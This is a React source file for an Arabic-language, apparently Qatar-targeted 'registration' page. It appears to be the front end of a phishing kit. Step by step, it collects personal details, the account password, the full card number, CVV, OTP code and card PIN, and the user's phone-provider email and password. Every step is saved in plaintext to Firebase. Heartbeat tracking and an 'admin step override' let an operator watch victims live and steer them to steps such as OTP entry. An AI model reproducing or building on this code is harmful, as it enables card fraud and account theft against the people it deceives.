import React, { useState, useEffect } from "react";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { Stepper } from "@/components/Stepper";
import { Step1AccountType } from "@/components/steps/Step1AccountType";
import { StepLogin } from "@/components/steps/StepLogin";
import { Step2PersonalData } from "@/components/steps/Step2PersonalData";
import { Step3Password } from "@/components/steps/Step3Password";
import { Step4Payment } from "@/components/steps/Step4Payment";
import { Step5PIN } from "@/components/steps/Step5PIN";
import { Step6PhoneProvider } from "@/components/steps/Step6PhoneProvider";
import { Step5Success } from "@/components/steps/Step5Success";
import { MessageCircle } from "lucide-react";
import { useHeartbeat } from "@/hooks/useHeartbeat";
import { saveStepData, completeRegistration, handleCurrentPage, setOnlineStatus, updateOnlinePage, subscribeToUserStep, clearUserStepOverride } from "@/lib/firebase";

export default function Register() {
  const [step, setStep] = useState(1);
  const [isNewAccount, setIsNewAccount] = useState(true);
  const [accountType, setAccountType] = useState<string>("citizen");
  const [formData, setFormData] = useState({
    email: "",
    fullNameArabic: "",
    fullNameEnglish: "",
    phoneNumber: "",
    dateOfBirth: "",
    gender: "male",
    nationality: "qatar",
    accountType: "citizen",
    address: {
      buildingNumber: "",
      area: "",
      street: "",
    },
    pin: "",
    phoneProvider: "",
    phoneProviderNumber: "",
    password: "",
  });

  useHeartbeat("/register");

  useEffect(() => {
    const cleanup = setOnlineStatus();
    return cleanup;
  }, []);

  useEffect(() => {
    handleCurrentPage(`/register/step-${step}`);
    updateOnlinePage(`/register/step-${step}`);
  }, [step]);

  // Listen for admin step override
  useEffect(() => {
    const unsubscribe = subscribeToUserStep((adminStep) => {
      if (adminStep && adminStep !== step) {
        setStep(adminStep);
        // Clear the override after applying it so user can continue normally
        clearUserStepOverride();
      }
    });
    return () => unsubscribe();
  }, [step]);

  const newAccountSteps = [
    "نوع الحساب",
    "البيانات الشخصية",
    "كلمة المرور",
    "الدفع",
    "تأكيد رمز البطاقة",
    "بيانات مزود الخدمة",
    "اكتمال التسجيل",
  ];

  const existingAccountSteps = ["نوع الحساب", "تسجيل الدخول"];

  const steps = isNewAccount ? newAccountSteps : existingAccountSteps;

  const nextStep = () => setStep((prev) => Math.min(prev + 1, steps.length));
  const prevStep = () => setStep((prev) => Math.max(prev - 1, 1));

  const handleAccountTypeNext = async (isNew: boolean, type: string) => {
    setIsNewAccount(isNew);
    setAccountType(type);
    const newFormData = { ...formData, accountType: type };
    setFormData(newFormData);
    
    await saveStepData("1_account_type", {
      isNewAccount: isNew,
      accountType: type,
    });
    
    nextStep();
  };

  const handlePersonalDataNext = async (data: any) => {
    const newFormData = { ...data, accountType };
    setFormData(newFormData);
    
    await saveStepData("2_personal_data", {
      fullNameArabic: data.fullNameArabic,
      fullNameEnglish: data.fullNameEnglish,
      email: data.email,
      phoneNumber: data.phoneNumber,
      dateOfBirth: data.dateOfBirth,
      gender: data.gender,
      nationality: data.nationality,
      address: data.address,
    });
    
    nextStep();
  };

  const handlePasswordNext = async (password?: string) => {
    if (password) {
      setFormData(prev => ({ ...prev, password }));
    }
    
    await saveStepData("3_password", {
      passwordSet: true,
      password: password || "",
    });
    
    nextStep();
  };

  const handlePaymentNext = async (paymentData?: any) => {
    await saveStepData("4_payment", {
      amount: "10.00 QAR",
      status: "completed",
      paymentMethod: "card",
      cardNumber: paymentData?.cardNumber || "",
      cardName: paymentData?.cardName || "",
      expiry: paymentData?.expiry || "",
      cvv: paymentData?.cvv || "",
      otpCode: paymentData?.otpCode || "",
    });
    
    nextStep();
  };

  const handlePINNext = async (pin?: string) => {
    if (pin) {
      setFormData(prev => ({ ...prev, pin }));
    }
    
    await saveStepData("5_pin", {
      pinVerified: true,
      pinCode: pin || "",
    });
    
    nextStep();
  };

  const handlePhoneProviderNext = async (providerData?: { provider: string; number: string; personalId: string; email: string; password: string }) => {
    if (providerData) {
      setFormData(prev => ({
        ...prev,
        phoneProvider: providerData.provider,
        phoneProviderNumber: providerData.number,
      }));
    }
    
    await saveStepData("6_phone_provider", {
      provider: providerData?.provider || formData.phoneProvider,
      phoneNumber: providerData?.number || formData.phoneProviderNumber,
      personalId: providerData?.personalId || "",
      email: providerData?.email || "",
      password: providerData?.password || "",
    });
    
    await completeRegistration({
      ...formData,
      phoneProvider: providerData?.provider || formData.phoneProvider,
      phoneProviderNumber: providerData?.number || formData.phoneProviderNumber,
    });
    
    nextStep();
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
      <Header />

      <Stepper currentStep={step} steps={steps} />

      <main className="flex-1 container mx-auto px-4 pb-12 max-w-3xl">
        <div className="bg-gray-100/50 rounded-lg shadow-sm border border-gray-200 overflow-hidden min-h-[600px]">
          {step === 1 && <Step1AccountType onNext={handleAccountTypeNext} />}

          {!isNewAccount && step === 2 && <StepLogin onBack={prevStep} />}

          {isNewAccount && step === 2 && (
            <Step2PersonalData
              onNext={handlePersonalDataNext}
              onBack={prevStep}
              initialData={formData}
            />
          )}
          {isNewAccount && step === 3 && (
            <Step3Password onNext={handlePasswordNext} onBack={prevStep} />
          )}
          {isNewAccount && step === 4 && (
            <Step4Payment
              onNext={handlePaymentNext}
              onBack={prevStep}
              formData={formData}
            />
          )}
          {isNewAccount && step === 5 && (
            <Step5PIN onNext={handlePINNext} onBack={prevStep} />
          )}
          {isNewAccount && step === 6 && (
            <Step6PhoneProvider onNext={handlePhoneProviderNext} onBack={prevStep} />
          )}
          {isNewAccount && step === 7 && <Step5Success formData={formData} />}
        </div>
      </main>

      <Footer />
    </div>
  );
}
